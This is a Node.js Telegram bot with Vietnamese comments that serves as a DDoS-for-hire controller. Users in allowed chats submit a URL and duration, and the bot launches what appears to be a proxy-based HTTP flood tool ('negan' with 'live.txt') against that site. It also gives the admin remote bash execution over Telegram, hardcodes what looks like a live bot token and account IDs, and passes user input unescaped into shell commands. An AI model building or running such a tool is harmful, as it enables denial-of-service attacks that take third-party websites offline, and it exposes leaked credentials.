const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// Cấu hình
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([
    -1002423723717, // Thay thế bằng group ID thực tế
    987654321, // Thay thế bằng group ID thực tế
    112233445, // Thay thế bằng group ID thực tế
    556677889, // Thay thế bằng group ID thực tế
    998877665  // Thay thế bằng group ID thực tế
]);
const maxConcurrentAttacks = 1; // Mỗi người dùng chỉ được chạy 1 lệnh cùng lúc
const maxTimeAttacks = 120; // Thời gian tối đa cho mỗi lệnh (giây)

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = {}; // Lưu trữ tiến trình của từng người dùng

// Thông báo bot đã sẵn sàng
let isBotReady = true;
bot.sendMessage(adminId, '[Version PRO] 🤖 Bot đã sẵn sàng nhận lệnh.');
console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.');

// Hàm lấy thông số hệ thống
const getSystemStats = () => {
    const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory;
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle;
        return acc + (100 - (idle / total) * 100);
    }, 0) / os.cpus().length).toFixed(2);
    return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
};

// Gửi thông số hệ thống định kỳ
setInterval(() => {
    const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(adminId, `Thông số đã sử dụng: 🚀\n- CPU đã sử dụng: ${stats.cpuUsagePercent}%\n- RAM đã sử dụng: ${stats.memoryUsagePercent}%\n\nThông số còn trống: ❤️\n- CPU còn trống: ${cpuFreePercent}%\n- RAM còn trống: ${stats.freeMemory}GB\n- Tổng RAM: ${stats.totalMemory}GB`);
}, 14000);

// Hàm gửi kết quả dưới dạng Markdown
const sendMarkdownResult = async (chatId, command, output) => {
    const message = `🚀 Kết quả lệnh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``;
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
        await bot.sendMessage(chatId, `🚫 Lỗi khi gửi kết quả: ${error.message}`);
    }
};

// Hàm thực thi lệnh pkill
const executePkill = async (chatId, file) => {
    const getPidCommand = `pgrep -f ${file}`, pkillCommand = `pkill -f -9 ${file}`;
    exec(getPidCommand, (error, stdout, stderr) => {
        const pids = stdout.trim().split('\n').filter(pid => pid.length > 0);
        if (pids.length === 0) return bot.sendMessage(chatId, '❌ Không tìm thấy tiến trình phù hợp.');
        exec(pkillCommand, (error) => {
            if (error) bot.sendMessage(chatId, `❌ Lỗi khi thực thi lệnh: ${error.message}`);
            else bot.sendMessage(chatId, `✅ Đã dừng tiến trình với PID: ${pids.join(', ')}`);
        });
    });
};

// Xử lý lệnh từ người dùng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);

    // Kiểm tra quyền thực thi lệnh
    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');

    // Xử lý lệnh tấn công (URL + thời gian)
    if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
        // Kiểm tra xem người dùng đang có lệnh nào chạy không
        if (currentAttacks[chatId]) return bot.sendMessage(chatId, '🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất.');

        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://'), parts = correctedText.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
        const [host, time] = parts;
        if (time > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.`);

        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        currentAttacks[chatId] = { pid: null, user: chatId }; // Lưu thông tin lệnh đang chạy
        bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);

        const child = exec(command, { shell: '/bin/bash' });
        child.on('close', () => {
            delete currentAttacks[chatId]; // Xóa thông tin lệnh đã hoàn tất
            bot.sendMessage(chatId, '✅ Tiến trình hoàn tất.');
        });
        return;
    }

    // Xử lý lệnh exe (chỉ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, 'Lệnh không được để trống. Ví dụ: "exe ls"');
        if (command.startsWith('pkill')) {
            const filesToKill = command.split(' ').slice(1);
            if (filesToKill.length === 0) return bot.sendMessage(chatId, '❌ Lệnh pkill cần có ít nhất một tên file.');
            for (const file of filesToKill) await executePkill(chatId, file);
            return;
        }
        const child = exec(command, { shell: '/bin/bash' });
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => sendMarkdownResult(chatId, command, output));
        return;
    }

    // Lệnh không hợp lệ
    bot.sendMessage(chatId, 'Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.');
});
